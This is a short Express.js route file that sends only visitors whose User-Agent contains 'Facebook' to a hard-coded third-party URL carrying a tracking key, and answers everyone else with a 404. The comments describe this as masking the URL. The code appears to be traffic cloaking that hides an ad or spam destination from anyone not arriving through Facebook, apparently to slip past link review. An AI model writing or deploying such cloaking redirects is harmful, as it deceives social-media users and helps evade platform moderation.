// api/redirect.js

const express = require('express');
const router = express.Router();

// The target URL to redirect and mask
const TARGET_URL = 'https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb';

// Middleware to handle redirection
router.get('*', (req, res) => {
  // Check if the request is from Facebook
  const userAgent = req.get('User-Agent') || '';
  if (userAgent.includes('Facebook')) {
    // Redirect and mask the URL for Facebook
    res.redirect(TARGET_URL);
  } else {
    // For other requests, you might want to send a 404 or handle them differently
    res.status(404).send('Not Found');
  }
});

module.exports = router;
